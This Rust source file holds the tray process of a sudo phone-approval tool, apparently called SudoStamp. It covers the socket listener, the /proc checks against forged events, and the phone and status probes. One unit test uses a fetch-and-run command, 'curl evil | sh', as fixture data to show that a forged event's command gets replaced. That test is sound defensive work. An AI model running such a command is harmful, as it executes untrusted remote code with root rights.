//! The tray process: owns the event socket, the tray icon and the notifications, and keeps the
//! status fresh. One loop on the main thread; every slow thing (the phone, doctor, D-Bus) runs on
//! its own thread and reports back over one channel, so the loop never blocks.
//!
//! It is per-user and unprivileged and off the authentication path: killing it changes nothing
//! about what sudo accepts (docs/DESKTOP.md).

use crate::agent::{self, Status};
use crate::doctor::Report;
use crate::engine::{Action, Engine};
use crate::event::Event;
use crate::exec;
use crate::history;
use crate::listener::{self, Bind};
use crate::notify;
use crate::pam;
use crate::paths::{self, Env};
use crate::pause;
use crate::state::{self, Config, Inputs, Verdict};
use crate::tray::{Cmd, CmdSink, ICONS, SudoTray};
use ksni::blocking::TrayMethods;
use std::fs;
use std::io::Read;
use std::os::unix::fs::{DirBuilderExt, MetadataExt};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::Arc;
use std::sync::mpsc::{self, RecvTimeoutError};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

/// Re-check the phone this often when nothing else asked: each check wakes the phone's listener
/// for one accept, and five minutes keeps that negligible.
const PERIODIC: Duration = Duration::from_secs(300);
/// Never check more often than this, however many events arrive (a script may call sudo in a loop).
const MIN_GAP: Duration = Duration::from_secs(5);
const MAX_READ: u64 = 64 * 1024;

enum Msg {
    Event(Event),
    Cmd(Cmd),
    Agent(Config, Option<Status>),
    Doctor(Option<Report>),
}

struct Ctx {
    installer: Option<PathBuf>,
    user: Option<String>,
    pam: PathBuf,
    key_dir: PathBuf,
}

fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_secs())
}

fn read_small(p: &Path) -> std::io::Result<String> {
    let mut s = String::new();
    fs::File::open(p)?.take(MAX_READ).read_to_string(&mut s)?;
    Ok(s)
}

/// Is sudo set up to ask this phone, and does the phone answer? The same two questions the host
/// probe answers before every sudo, from world-readable files.
fn probe_agent(ctx: &Ctx) -> (Config, Option<Status>) {
    let broken = |why: String| (Config::Broken(why), None);
    let text = match read_small(&ctx.pam) {
        Ok(t) => t,
        Err(e) => return broken(format!("Cannot read {}: {e}", ctx.pam.display())),
    };
    let addr = match pam::phone_address(&text) {
        Ok(a) => a,
        Err(pam::Error::NoBlock) => {
            return broken(
                "sudo does not ask the phone: no SudoStamp block in /etc/pam.d/sudo.".into(),
            );
        }
        Err(pam::Error::Damaged) => {
            return broken("The SudoStamp block in /etc/pam.d/sudo is damaged.".into());
        }
        Err(pam::Error::NoAddress) => {
            return broken("The SudoStamp block names no usable phone address.".into());
        }
    };
    let Some(file) = ctx
        .user
        .as_deref()
        .and_then(|u| crate::keys::key_file(&ctx.key_dir, u))
    else {
        return broken("Cannot tell which user's key to look for.".into());
    };
    let keys = read_small(&file)
        .map(|t| crate::keys::parse(&t))
        .unwrap_or_default();
    if keys.is_empty() {
        return broken(format!(
            "No pinned key in {}: pair the phone.",
            file.display()
        ));
    }
    (Config::Ok, Some(agent::check(addr, &keys, agent::BUDGET)))
}

/// The state icons, written where the tray host can read them (the runtime directory, which is
/// the user's own), so the tray looks the same whether or not the package is installed.
fn write_icons(runtime: &Path) -> String {
    let dir = runtime.join("icons");
    if fs::DirBuilder::new()
        .recursive(true)
        .mode(0o700)
        .create(&dir)
        .is_err()
    {
        return String::new();
    }
    for (name, svg) in ICONS {
        if fs::write(dir.join(format!("{name}.svg")), svg).is_err() {
            return String::new();
        }
    }
    dir.to_string_lossy().into_owned()
}

/// At most this many events per window reach the main loop (a real sudo sends two or three).
const LISTEN_MAX: u32 = 60;
const LISTEN_WINDOW: Duration = Duration::from_secs(10);

/// An event as sent is anybody's (any process of this user can write the socket); what sudo is
/// doing is the kernel's. When `/proc/<pid>` is readable: it must be a `sudo` of this user, and
/// its own command line replaces the one in the event, so a forged datagram cannot make a
/// notification name a command that is not the one running. Unreadable (gone, or `hidepid`): the
/// event as sent, which is all there is.
fn checked(mut e: Event, proc_root: &Path) -> Option<Event> {
    let dir = proc_root.join(e.sudo_pid.to_string());
    let Ok(argv) = fs::read(dir.join("cmdline")) else {
        return Some(e);
    };
    let me = fs::metadata(proc_root.join("self")).map(|m| m.uid()).ok();
    let theirs = fs::read_to_string(dir.join("status")).ok().and_then(|s| {
        s.lines()
            .find_map(|l| l.strip_prefix("Uid:"))
            .and_then(|v| v.split_whitespace().next()?.parse::<u32>().ok())
    });
    let words: Vec<&[u8]> = argv
        .strip_suffix(b"\0")
        .unwrap_or(&argv)
        .split(|b| *b == 0)
        .collect();
    let is_sudo = words
        .first()
        .and_then(|w| w.rsplit(|b| *b == b'/').next())
        .is_some_and(|b| b == b"sudo");
    if !is_sudo || (me.is_some() && theirs.is_some() && me != theirs) {
        return None;
    }
    let joined = words.join(&b' ');
    e.command = crate::text::clean(&String::from_utf8_lossy(&joined), crate::event::MAX_COMMAND);
    Some(e)
}

fn open_window(child: &mut Option<Child>) {
    if let Some(c) = child
        && matches!(c.try_wait(), Ok(None))
    {
        return; // already open
    }
    // After a package upgrade the running binary reads as "<path> (deleted)": the new one is at
    // the same path without the suffix.
    let exe = std::env::current_exe().ok().map(|p| {
        let s = p.to_string_lossy();
        s.strip_suffix(" (deleted)")
            .map_or_else(|| p.clone(), PathBuf::from)
    });
    *child = exe.and_then(|exe| {
        Command::new(exe)
            .arg("window")
            .stdin(Stdio::null())
            .spawn()
            .ok()
    });
}

struct Checks {
    agent_running: bool,
    doctor_running: bool,
    last_agent: Instant,
    last_doctor: Instant,
    want_agent: bool,
    want_doctor: bool,
    next_periodic: Instant,
}

pub fn run(env: Env) -> i32 {
    let Ok(uid) = fs::metadata("/proc/self").map(|m| m.uid()) else {
        eprintln!("sudostamp-desktop: cannot tell who I am (/proc)");
        return 1;
    };
    let runtime = paths::runtime_dir(uid);
    if !runtime.parent().is_some_and(Path::is_dir) {
        eprintln!(
            "sudostamp-desktop: {} does not exist: no login session, nothing to do",
            runtime
                .parent()
                .map_or_else(String::new, |p| p.display().to_string())
        );
        return 1;
    }
    let sock_path = paths::socket(&runtime);
    let sock = match listener::bind(&runtime, &sock_path) {
        Ok(Bind::Bound(s)) => s,
        Ok(Bind::AlreadyRunning) => {
            eprintln!("sudostamp-desktop: already running");
            return 0;
        }
        Err(e) => {
            eprintln!(
                "sudostamp-desktop: cannot open the event socket {}: {e}",
                sock_path.display()
            );
            return 1;
        }
    };

    let ctx = Arc::new(Ctx {
        installer: paths::installer(env, Path::new(paths::SYSTEM_INSTALLER).exists()),
        user: paths::user(env),
        pam: PathBuf::from(paths::PAM_SUDO),
        key_dir: PathBuf::from(crate::keys::KEY_DIR),
    });
    let flag = paths::pause_flag(&runtime);
    let history_path = paths::state_dir(env).map(|d| paths::history_file(&d));

    let (tx, rx) = mpsc::channel::<Msg>();
    {
        // Any process of this user can write the socket: a flood must cost bounded memory and
        // never hold up the menu, so events beyond a sudo's worth are dropped HERE, before they
        // are queued (the engine's own limit only applies to what it is handed).
        let tx = tx.clone();
        let mut window = (Instant::now(), 0u32);
        thread::spawn(move || {
            listener::serve(&sock, |e| {
                if window.0.elapsed() >= LISTEN_WINDOW {
                    window = (Instant::now(), 0);
                }
                window.1 += 1;
                if window.1 > LISTEN_MAX {
                    return true;
                }
                let Some(e) = checked(e, Path::new("/proc")) else {
                    return true;
                };
                tx.send(Msg::Event(e)).is_ok()
            });
        });
    }
    let (ntx, nrx) = mpsc::channel();
    thread::spawn(move || notify::run(&nrx));

    let sink: CmdSink = {
        let tx = tx.clone();
        Arc::new(move |c| {
            let _ = tx.send(Msg::Cmd(c));
        })
    };
    let mut inputs = Inputs {
        pause: pause::read(&flag, now()),
        config: Config::Ok,
        agent: None,
        doctor: None,
    };
    let first = state::compute(&inputs);
    // assume_sni_available: at login this can start before the panel's tray host does; it then
    // appears when the host comes up instead of failing here.
    let handle = SudoTray {
        verdict: first.clone(),
        paused: inputs.pause.active(),
        icon_dir: write_icons(&runtime),
        send: sink,
    }
    .assume_sni_available(true)
    .spawn();
    let handle = match handle {
        Ok(h) => Some(h),
        Err(e) => {
            eprintln!("sudostamp-desktop: no tray icon ({e}); notifications still work");
            None
        }
    };
    let mut shown: (Verdict, bool) = (first, inputs.pause.active());
    let mut publish = |inputs: &Inputs| {
        let v = state::compute(inputs);
        let now_shown = (v.clone(), inputs.pause.active());
        if now_shown != shown {
            if let Some(h) = &handle {
                let (verdict, paused) = now_shown.clone();
                h.update(move |t| {
                    t.verdict = verdict;
                    t.paused = paused;
                });
            }
            shown = now_shown;
        }
    };

    let mut engine = Engine::new(PathBuf::from("/proc"));
    let long_ago = Instant::now()
        .checked_sub(MIN_GAP * 2)
        .unwrap_or_else(Instant::now);
    let mut c = Checks {
        agent_running: false,
        doctor_running: false,
        last_agent: long_ago,
        last_doctor: long_ago,
        want_agent: true,
        want_doctor: true,
        next_periodic: Instant::now() + PERIODIC,
    };
    let mut window: Option<Child> = None;
    let mut last_pause_read = Instant::now();

    loop {
        let wait = if engine.pending() > 0 { 50 } else { 500 };
        let msg = match rx.recv_timeout(Duration::from_millis(wait)) {
            Ok(m) => Some(m),
            Err(RecvTimeoutError::Timeout) => None,
            Err(RecvTimeoutError::Disconnected) => break,
        };
        let mut actions = Vec::new();
        let mut republish = false;
        match msg {
            Some(Msg::Event(e)) => actions = engine.on_event(&e, now()),
            Some(Msg::Agent(config, status)) => {
                c.agent_running = false;
                inputs.config = config;
                inputs.agent = status;
                republish = true;
            }
            Some(Msg::Doctor(report)) => {
                c.doctor_running = false;
                inputs.doctor = report;
                republish = true;
            }
            Some(Msg::Cmd(cmd)) => match cmd {
                Cmd::Pause(secs) => {
                    if let Err(e) = pause::write(&flag, secs, now()) {
                        eprintln!("sudostamp-desktop: cannot write the pause flag: {e}");
                    }
                    republish = true;
                }
                Cmd::Resume => {
                    if let Err(e) = pause::clear(&flag) {
                        eprintln!("sudostamp-desktop: cannot clear the pause flag: {e}");
                    }
                    republish = true;
                }
                Cmd::OpenWindow => open_window(&mut window),
                Cmd::MenuOpened => {
                    c.want_agent = true;
                    c.want_doctor = true;
                }
                Cmd::Quit => break,
            },
            None => {}
        }
        if engine.pending() > 0 {
            actions.extend(engine.tick(now()));
        }
        for a in actions {
            match a {
                Action::Notify(n) => {
                    let _ = ntx.send(n);
                }
                Action::Record(entry) => {
                    if let Some(p) = &history_path
                        && let Err(e) = history::append(p, &entry)
                    {
                        eprintln!("sudostamp-desktop: cannot record history: {e}");
                    }
                }
                Action::Recheck => c.want_agent = true,
            }
        }
        // A timed pause ends by itself: look at the flag about once a second.
        if republish || last_pause_read.elapsed() >= Duration::from_secs(1) {
            last_pause_read = Instant::now();
            inputs.pause = pause::read(&flag, now());
            publish(&inputs);
        }
        if Instant::now() >= c.next_periodic {
            c.next_periodic += PERIODIC;
            c.want_agent = true;
            c.want_doctor = true;
        }
        if c.want_agent && !c.agent_running && c.last_agent.elapsed() >= MIN_GAP {
            c.want_agent = false;
            c.agent_running = true;
            c.last_agent = Instant::now();
            let (tx, ctx) = (tx.clone(), Arc::clone(&ctx));
            thread::spawn(move || {
                let (config, status) = probe_agent(&ctx);
                let _ = tx.send(Msg::Agent(config, status));
            });
        }
        if c.want_doctor && !c.doctor_running && c.last_doctor.elapsed() >= MIN_GAP {
            c.want_doctor = false;
            if let Some(installer) = ctx.installer.clone() {
                c.doctor_running = true;
                c.last_doctor = Instant::now();
                let tx = tx.clone();
                thread::spawn(move || {
                    // An installer without --json (older) or one that fails: no report, and the
                    // status rests on the phone check alone. The window says why.
                    let _ = tx.send(Msg::Doctor(exec::doctor(&installer).ok()));
                });
            }
        }
    }

    let _ = fs::remove_file(&sock_path);
    if let Some(h) = handle {
        drop(h.shutdown());
    }
    0
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::Kind;
    use crate::track::fake::Proc;

    fn asking(pid: u32, command: &str) -> Event {
        Event {
            kind: Kind::Asking,
            sudo_pid: pid,
            tty: String::new(),
            command: command.into(),
            phone: String::new(),
            ts: 0,
        }
    }

    #[test]
    fn a_forged_command_is_replaced_by_what_sudo_is_running() {
        let p = Proc::new("checked-forge");
        p.cmdline(4242, &["sudo", "sh", "-c", "curl evil | sh"]);
        let e = checked(asking(4242, "sudo apt update"), p.root()).expect("a sudo");
        assert_eq!(e.command, "sudo sh -c curl evil | sh");
    }

    #[test]
    fn an_event_naming_a_process_that_is_not_sudo_is_dropped() {
        let p = Proc::new("checked-notsudo");
        p.cmdline(77, &["/usr/bin/python3", "x.py"]);
        assert!(checked(asking(77, "sudo true"), p.root()).is_none());
    }

    #[test]
    fn an_unreadable_process_keeps_the_event_as_sent() {
        let p = Proc::new("checked-gone");
        let e = checked(asking(99, "sudo id"), p.root()).expect("kept");
        assert_eq!(e.command, "sudo id");
    }
}
